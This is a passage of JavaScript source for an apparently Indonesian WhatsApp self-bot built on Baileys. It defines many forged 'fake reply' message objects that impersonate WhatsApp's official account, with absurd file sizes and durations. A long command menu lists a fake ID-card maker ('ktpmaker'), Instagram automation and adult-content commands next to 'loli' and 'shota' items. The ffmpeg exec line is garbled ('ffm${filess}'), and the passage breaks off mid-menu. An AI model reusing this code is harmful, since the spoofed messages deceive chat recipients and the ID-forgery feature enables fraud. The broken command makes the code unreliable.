                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./lib/image/fino.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
const fimg = {
 quoted : {
	key : {
		remoteJid : "6283157292861@s.whatsapp.net",
		fromMe : true,
		id : "64832196FC49B05FD3182E4BAE1EAE94"
	},
	message: {
					imageMessage: {
						url: "https://mmg.whatsapp.net/d/f/AsSFqef2fU4csEpys3AD3BNmJSyfhC0g3Ew4SKpfuTZY.enc",
						mimetype: "image/jpeg",
						fileSha256: "jUkhnKBquiOJVekB6a+d0PkWiLR036qpD1tTLSnvsgU=",
						fileLength: "999999999",
						height: 1600,
						width: 720,
						mediaKey: "qmz+XqsPxv8/jq4332vGRyQqyYp4E95qRVz3J90xqGk=",
						fileEncSha256 : "Htc8e3dxNULJikm/gjn8DV36Wv+Z1t23sKsGTuyWKmQ=",
						directPath : "/v/t62.7118-24/40334139_153810840237115_8483597241512083031_n.enc?ccb=11-4&oh=bf4af00df1bd8703eb62195af1b2c13e&oe=61582834",
						mediaKeyTimestamp : "1630606272",
						jpegThumbnail : "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAQIFBgMBAQEBAQAAAAAAAAAAAAAAAAABAwT/2gAMAwEAAhADEAAAAEYxo1qxRGN52Fco7ilIp2Te+auenow9QOmIA//EACQQAAIABQMEAwAAAAAAAAAAAAABAgMQEVITFFEEEiAhMWGB/9oACAEBAAE/AN9KxZF1sGLN/BizfysWXfocUT+WXZd0svBl6cUaLM4P0a+yCNQ91+Dg9jTpoSsEaMrBGjKwRoSsF4//xAAcEQABAwUAAAAAAAAAAAAAAAABAAITAxAgUVL/2gAIAQIBAT8AlehUcMAoT0FCd3//xAAZEQACAwEAAAAAAAAAAAAAAAAAEQEQICH/2gAIAQMBAT8A5mRjv//Z",
						scansSidecar : "Pu0a/C0rZjOjjmNNWA7UCsVNRiBXfxTyHQh6f++7ZEgVdn8ppTFx/Q==",
						scanLengths: [
							8004,
							55576,
							20624,
							24350
						],
					}
				}
  }
}
const fonce = {
	"key": {
		"remoteJid": "6283157292861@s.whatsapp.net",
		"fromMe": false,
		"id": "156F258F478D9DBEE37F5849AE15BC38"
	},
						message: {
			"ViewOnceMessage": {
							"imageMessage": {
								"url": "https://mmg.whatsapp.net/d/f/Av4Qj8oVVr1NAZRIxH2kvFg5BeDZhve1IpQYcfHmX7Hv.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "BoD0mDSeR0+QXVXnQsD65SOxDAZNQqNA4MehS/KPXQ4=",
								"fileLength": "211214",
								"mediaKey": "AXKwXv7hkn4I8M8dO76QYq0O6D51uQb+orXo2za08Rs=",
								"fileEncSha256": "lof5YmYgQvyaM6jHajEMPPO3OalYaJxii/G7wkTgrqg=",
								"jpegThumbnail": `${heker}`,
								"viewOnce": true,
							}
						}
					}
				}
		const katalog = (teks) => {
             res = hexa.prepareMessageFromContent(from,{ "orderMessage":{ "itemCount": 20000, "message": teks, "footerText": `${fake}`, "thumbnail": heker, "surface": 'CATALOG' }}, {quoted:ftroli})
             hexa.relayWAMessage(res)
        }
const catalog = async(gambare, nomore, titlenye, descnye) => {
imeg = await hexa.prepareMessage(data.from, gambare, 'imageMessage')
imeu = imeg.message.imageMessage
hexa.relayWAMessage(await hexa.prepareMessageFromContent(data.from, { productMessage: {
businessOwnerJid: `${configs.botnumber}@s.whatsapp.net`,
product: {
productId: '1011',
productImage: heker,
title: 'peler agung',
description:  'buat coli',
currencyCode: 'IDR',
priceAmount1000: '10000000',
retailerId: '0507',
url: `...`,
productImageCount: 2021,
salePriceAmount1000: '7.8000',
}
}
}, {quoted: data.message}))
}
 //FAKEREPLY PRODUCT
const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./lib/image/fino.jpeg`) //Gambarnye
					},
					"title": `🌏 Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 🌏`,
					"description": "SELF BOT", 
					"currencyCode": "USD",
					"priceAmount1000": "2021-2021 ",
					"retailerId": "*[𝒾𝒶𝓂𝒻𝒾𝓃𝑜𝒙菲诺 ]*",
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
//FAKEREPLY TROLI
const ftroli = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 2021,
                            status: 1,
                            surface : 9,
                            message:`🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n菲諾·朱利安·安加`, //Kasih namalu
                            orderTitle: '𝚝𝚑𝚒𝚜𝚒𝚜𝚗𝚘𝚝𝚋𝚄𝚐',
                            thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net'
          
                          }
                        }
                      }
//FAKEREPLY LOCATION
const flokasi = { key : { participant : '0@s.whatsapp.net'}, message: {locationMessage: {name: 'Persimpangan surga-Neraka',jpegThumbnail: fs.readFileSync(`./lib/image/fino.jpeg`)}}}
                          
                       
                      
//FAKEREPLY DOCUMENT
const fdocs = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: '𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺', 
                    jpegThumbnail: fs.readFileSync('./lib/image/fino.jpeg')
                          }
                        }
                      }
//FAKEREPLY VIDEO
const fvideo = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title":"hallo bang",
                 "h": `Hmm`,
                 'seconds': '9999999999999', 
                 'caption': `🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n菲諾·朱利朱利安·安加`,
                 'jpegThumbnail': fs.readFileSync('./lib/image/fino.jpeg')
                        }
                       }
	                  }
//FAKEREPLY GROUPINVITE
const fgclink = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": "953962993692",
			"groupName":"y",
            "caption": "𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺", 
            'jpegThumbnail': fs.readFileSync('./lib/image/fino.jpeg')
		}
	}
}
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message":{
					"groupInviteMessage":{
						"groupJid": "6282223014661-1612197617@g.us",
						"inviteCode": "T04IYmOjakNhjJZw",
						"inviteExpiration": "9999999",
						"groupName": "🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿",
    }
  }
}
//FAKEREPLY GIF
const fgif = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title":"𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺",
                 "h": `Hmm`,
                 'seconds': '99999999999', 
                 'gifPlayback': 'true', 
                 'caption': '菲诺',
                 'jpegThumbnail': fs.readFileSync('./lib/image/fino.jpeg')
                        }
                       }
	                  } 
//FAKEREPLY TEXT WITH THUMBNAIL
const ftextt = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) }, message: { "extendedTextMessage": {"text":"hallo bang","title": `Hmm`, 'jpegThumbnail': fs.readFileSync(`./lib/image/fino.jpeg`)}}}
                     
//FAKEREPLY VN
const fvn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "${second}",
                 "ptt": "true"
                        }
	                  } 
                 }
const fstick = {
key: {
		participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) },
message: { 
					stickerMessage: {
						url : "https://mmg.whatsapp.net/d/f/Apn-WA9AWxxFLs8W4ApCzLSyYS4jfzTtLxPpJWRvDJzX.enc",
						fileSha256: "RteOomtbMtqczGOieeUKuLNqpmLKlQvOjIg2ArbICfM=",
						fileEncSha256: "1OALMW3YcuX1KmF3StoeayUY3beHlcJaUU7vr1mtPjU=",
						mediaKey: "40Ca2456rRHEmR8/mGoF3IEjDkHg7zfcdnIWsGNNk2M=",
						mimetype: "image/webp",
						height: 64,
						width: 64,
				directPath: "/v/t62.15575-24/25998575_364740581795838_6163946410383635277_n.enc?ccb=11-4&oh=d94b136905018da77dc70a704ae1ee00&oe=61564D29",
						fileLength: "13300",
						mediaKeyTimestamp: "1630564969",
								}
    }
}
const fstick2 = {
key: {
		participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
					stickerMessage: {
			            url: "https://mmg.whatsapp.net/d/f/AsdWLvhs6HzTVXnUPeKx0HwaOu2fMULBOoWvcwSq7UFZ.enc", 
			            fileSha256: "rJo+aytbZuO3eBdqZv2LM0tNekFkS4xOJ32oWPuDANw=", 
                        fileEncSha256: "IuQDHy80VnTps8Z4SOVp29R7mM5MTZl+yMxbyjCAOPk=",
                        mediaKey: "o8nUNtr7Rt3xorRBkaoUXIG02FXYmpcfODamOO9LU/g=",
						mimetype: "image/webp",
						 height: 64,
						width: 64,
						directPath: "/v/t62.15575-24/13168186_543387126706005_212227891975731600_n.enc?ccb=11-4&oh=681a42dace0258a67544f4df45524b24&oe=60F422D8",
fileLength: "20236",
mediaKeyTimestamp: "1624176146"
					}
				}
			}
const fstick3 = {
key: {
		participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "62895336253039-1618869667@g.us" } : {}) },
	message: {
				quotedMessage: {
					stickerMessage: {
						url: "https://mmg.whatsapp.net/d/f/Av1Q0mUu6MWTqmV0ZhtYwTWjcCWeeVdsOaVBJ6wCJMrY.enc",
						fileSha256: "pTZOxmt9g3VI0mCxF7tXANDVahUxndikFlvM56tFb60=",
						fileEncSha256: "lnM5M599vV2jRbaAVoH6GKFpbTUl8/7VmTQak+NHLxA=",
						mediaKey: "dbse0kLS7bxxXD6ij4gP0C/+fcjjf+g1WDsKwC0kxdo=",
						mimetype: "image/webp",
						height: 64,
						width: 64,
						directPath: "/v/t62.15575-24/29503158_564084778121075_5890594644841843386_n.enc?ccb=11-4&oh=479200247a589cc9a5e9af47f33e10a7&oe=6157513C",
						fileLength: "3010",
      mediaKeyTimestamp: "1630564969",
					}
				}
			}
}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffm${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        hexa.sendMessage(to, media, MessageType.sticker,{quoted:ftroli})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    hexa.sendMessage(to, media, type, { quoted: ftroli, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
//FUNCTION
    
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        await delay(3000)
        hexa.groupRemove(from, [sender]);
      }
    }
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./lib/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.miinutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./lib/image/fino.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./lib/image/fino.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
//=======================================================================<\\>==========================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green','white']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split("@")[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split("@")[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split("@")[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split("@")[0]), 'in', color(groupName), 'args :', color(args.length))
 
//Auto Respon 


//Auto resoon suara
if (budy.match(`I LOVE YOU`,`ILY`, `sayang`,`love you`)){
p = fs.readFileSync('./lib/audio/i love you.mp3')
hexa.sendMessage(from, p, audio, {quoted: fvideo,ptt: true})
}

//Auto respon sticker
if(budy.match(`bokep`,`Bokep`)){
result = fs.readFileSync(`./lib/sticker/tobat.webp`)
  hexa.sendMessage(from, result, sticker, {
quoted: fvideo
  })
}
if (!mek.key.fromMe && banChats === true) return
if (budy.match(`hai`,`Hai`,`hi`,`Hi`)){
 await delay(5000)
 reply(`Hai juga ${pushname}`)
}
 hexa.updatePresence(from, Presence.recording)

switch (command) {
case 'start': 
 case 'anonymouschat':
   hexa.updatePresence(from, Presence.recording)
var thumbnail = fs.readFileSync('./lib/image/fino.jpeg')
		var media = await hexa.prepareMessage(from, thumbnail, MessageType.image)
media.message = (Object.keys(media.message)[0] === 'ephemeralMessage') ? media.message.ephemeralMessage.message : media.message
	var button23= [
		{buttonId: `${prefix}tartar`, buttonText: {displayText: 'Start'}, type: 1},
		{buttonId: `${prefix}next`, buttonText: {displayText: 'Next'}, type: 1},
		]
		var buttonMessageee9 = {
		contentText: `Anonymous chat versi lite`,
footerText: 'Click Here',
		buttons: button23,
		headerType: 4,
		imageMessage: media.message.imageMessage
		}
		await hexa.sendMessage(from, buttonMessageee9, MessageType.buttonsMessage, {sendEphemeral:true, quoted: fvideo, jpegThumbnail: fs.readFileSync('./lib/image/cecan.jpeg'),contextInfo: {"forwardingScore":99999, "isForwarded":true}})
				break
				case 'tartar':
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply(`Find for a partner...\n• wa.me/${anug}\n• Partner found: 🙉\n*${prefix}next find a new partner`)
				break
 case 'button':
  nomor = `6288210864298@s.whatsapp.net`
   nomor2 = `50587753432@s.whatsapp.net`
   run = process.uptime()
   hexa.updatePresence(from, Presence.recording)
var thumbnail = fs.readFileSync('./lib/image/cecan.jpeg')
		var media = await hexa.prepareMessage(from, thumbnail, MessageType.image)
media.message = (Object.keys(media.message)[0] === 'ephemeralMessage') ? media.message.ephemeralMessage.message : media.message
	var iniButton92 = [
		{buttonId: `${prefix}owner2`, buttonText: {displayText: '👤 𝑶𝑾𝑵𝑬𝑹 👤'}, type: 1},
		{buttonId: `${prefix}stat`, buttonText: {displayText: '⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️'}, type: 1},
  {buttonId: `${prefix}source`, buttonText: {displayText: '🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨️'}, type: 1}

		]
		var buttonMessage99 = {
		contentText: `                   🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n\n                  菲諾·朱利安·安加拉\n\n${ucapanWaktu} @${sender.split("@")[0]}
*⛃⃝🔖Prefix* : [ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]
*⛃⃝⚙️Status* : [ ${banChats == 'true' ? 'PUBLIC' : 'SELF'} ]
*⛃⃝⏳Activate* : [ ${kyun(run)} ]
*⛃⃝🔋Baterai* : [ ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} ]
*⛃⃝🧾Lib* : [ BAILEYS ]
*⛃⃝🗒️Language* : [ JavaScript ]
*⛃⃝📱Device* : [ ${device_manufacturer} ]
*⛃⃝🙋Owner* : [ @${nomor.split("@")[0]} , @${nomor2.split("@")[0]} ]

┏━━━━❒ *[ DATE 🌍 ]*
┣━━ ❒ ${ucapanWaktu}
┣➣Jam : [ ${time} WIB ]
┣➣Jam : [ ${wit} WIT ] 
┣➣Jam : [ ${wita} WITA ]
┗━━━━ ❒

More??....${readmore}    

		*[ INSTAGRAM TOOLS ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igfollow_
┣ ◩ _${prefix}igunfollow_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}igcomment_
┣ ◩ _${prefix}igimage_
┣ ◩ _${prefix}upinstastory_
┣ ◩ _${prefix}upfeed_
┣ ◩ _${prefix}block_
┣ ◩ _${prefix}unblock_
┣ ◩ _${prefix}igsavepost_
┣ ◩ _${prefix}igunsvpost
┗━━━━━━━━ ❑


		*[ 𝙼𝙰𝙺𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}sticker_
┣ ◩ _${prefix}swm_ <author|packname>
┣ ◩ _${prefix}take_ <author|packname>
┣ ◩ _${prefix}fdeface_
┣ ◩ _${prefix}ttp_
┣ ◩ _${prefix}ttp2
┣ ◩ _${prefix}ttp3_
┣ ◩ _${prefix}ttp4_
┣ ◩ _${prefix}fakedonald_
┣ ◩ _${prefix}ktpmaker_
┣ ◩ _${prefix}smoji_ <emoji>
┣ ◩ _${prefix}smoji2_ <emoji>
┣ ◩ _${prefix}wasted_ 
┣ ◩ _${prefix}triggered_
┗━━━━━━━━ ❑


     *[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}toimg_
┣ ◩ _${prefix}tomp3_
┣ ◩ _${prefix}tomp4_
┣ ◩ _${prefix}slow_
┣ ◩ _${prefix}fast_
┣ ◩ _${prefix}reverse_
┣ ◩ _${prefix}tourl_
┗━━━━━━━━ ❑

   *[ 𝙶𝙴𝚃 𝙸𝙼𝙶, 𝚅𝙽, 𝚂𝚃𝙸𝙺 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}getvn_
┣ ◩ _${prefix}listvn_
┣ ◩ _${prefix}getstik_
┣ ◩ _${prefix}liststik_
┣ ◩ _${prefix}getimg_
┣ ◩ _${prefix}listimg
┗━━━━━━━━ ❑

   *[ 𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}slot_ (Dalam perbaikan)
┣ ◩ _${prefix}tictacto_ (Dalam perbaikan)
┗━━━━━━━━ ❑

     *[ 𝟏𝟖+ 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}xhamster_
┣ ◩ _${prefix}xhamstersearch_ <query>
┣ ◩ _${prefix}xnxx_
┣ ◩ _${prefix}xnxxsearch_ <query>
┣ ◩ _${prefix}nhentai_
┣ ◩ _${prefix}nhentaisearch_ < kode >
┣ ◩ _${prefix}nhentaipdf_
┣ ◩ _${prefix}nekopoi_
┣ ◩ _${prefix}nekopoisearch_ <query>
┗━━━━━━━━ ❑


 *[ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙼𝙰𝙶𝙴 & 𝙼𝙰𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}18+image_
┣ ◩ _${prefix}18+image2_
┣ ◩ _${prefix}textpro_
┣ ◩ _${prefix}textpro2_
┣ ◩ _${prefix}logomaker_
┣ ◩ _${prefix}ephoto_
┗━━━━━━━━ ❑ 


     *[ 𝙰𝙽𝙸𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}art_
┣ ◩ _${prefix}bts_
┣ ◩ _${prefix}exo_
┣ ◩ _${prefix}elf_
┣ ◩ _${prefix}loli_
┣ ◩ _${prefix}neko_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}shota_
┣ ◩ _${prefix}husbu_
┣ ◩ _${prefix}sagiri_
┣ ◩ _${prefix}shinobu_
┣ ◩ _${prefix}megumin_
┣ ◩ _${prefix}wallnime_
┣ ◩ _${prefix}character_
┣ ◩ _${prefix}manga_
┣ ◩ _${prefix}kusonime_
┣ ◩ _${prefix}kusonimesearch_ <query>
┣ ◩ _${prefix}otakudesu_
┣ ◩ _${prefix}otakudesusearch_ <query>
┣ ◩ _${prefix}anime_
┣ ◩ _${prefix}pixiv_
┣ ◩ _${prefix}pixivdl_
┣ ◩ _${prefix}chara_
┣ ◩ _${prefix}otaku_
┗━━━━━━━━ ❑


      *[ 𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}playstore_
┣ ◩ _${prefix}playstore2_
┣ ◩ _${prefix}shopee_
┣ ◩ _${prefix}infofilm_
┣ ◩ _${prefix}lk21_
┣ ◩ _${prefix}ssweb_
┣ ◩ _${prefix}shortlink_
┣ ◩ _${prefix}ssweb2_
┣ ◩ _${prefix}ceritahoror_ <random>
┣ ◩ _${prefix}wattpad_
┣ ◩ _${prefix}wattpadsearch_ <query>
┣ ◩ _${prefix}drakorongoing_
┣ ◩ _${prefix}covidindo_
┣ ◩ _${prefix}covidglobal_
┣ ◩ _${prefix}asupan_ <random>
┣ ◩ _${prefix}wancak_
┣ ◩ _${prefix}faketoko_
┣ ◩ _${prefix}cuaca_
┣ ◩ _${prefix}infogempa_
┣ ◩ _${prefix}cnninternasional_
┣ ◩ _${prefix}cnnnasional_
┣ ◩ _${prefix}cnnindonesia_
┣ ◩ _${prefix}newsinfo_
┣ ◩ _${prefix}cerpen_
┣ ◩ _${prefix}stickerwa_ <query>
┣ ◩ _${prefix}google_ <query
┣ ◩ _${prefix}lirik_
┣ ◩ _${prefix}lirik2_
┣ ◩ _${prefix}kbbi_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}jadwaltv_
┣ ◩ _${prefix}jadwaltvnow_
┣ ◩ _${prefix}jadwalbola_
┣ ◩ _${prefix}kodepos_ <query>
┣ ◩ _${prefix}telesticker_
┗━━━━━━━━ ❑


     *[ 𝙶𝚁𝙾𝚄𝙿 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}antibule_
┣ ◩ _${prefix}antihidetag_
┣ ◩ _${prefix}antiviewonce_
┣ ◩ _${prefix}group_ (open/close)
┣ ◩ _${prefix}add_
┣ ◩ _${prefix}kick_
┣ ◩ _${prefix}demote_
┣ ◩ _${prefix}promote_
┣ ◩ _${prefix}add2_
┣ ◩ _${prefix}kick2_
┣ ◩ _${prefix}demote2_
┣ ◩ _${prefix}promote2_
┣ ◩ _${prefix}tagall_
┣ ◩ _${prefix}tagall2_
┣ ◩ _${prefix}tagall3_
┣ ◩ _${prefix}tagall4_
┣ ◩ _${prefix}tagall5_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}grup_ (open/close)
┣ ◩ _${prefix}closegc_
┣ ◩ _${prefix}opengc_
┗━━━━━━━━ ❑

    *[ 𝙸𝚂𝙻𝙰𝙼 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}asmaulhusna_ <query>
┣ ◩ _${prefix}kisahnabi_ <query>
┣ ◩ _${prefix}jadwalsholat_ <query>
┣ ◩ _${prefix}alquran_
┣ ◩ _${prefix}alquranaudio_
┣ ◩ _${prefix}listsurah_
┗━━━━━━━━ ❑


    *[ 𝚄𝙿𝚂𝚆 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}upswteks_
┣ ◩ _${prefix}upswimage_
┣ ◩ _${prefix}upswvideo_
┣ ◩ _${prefix}upswlokasi_
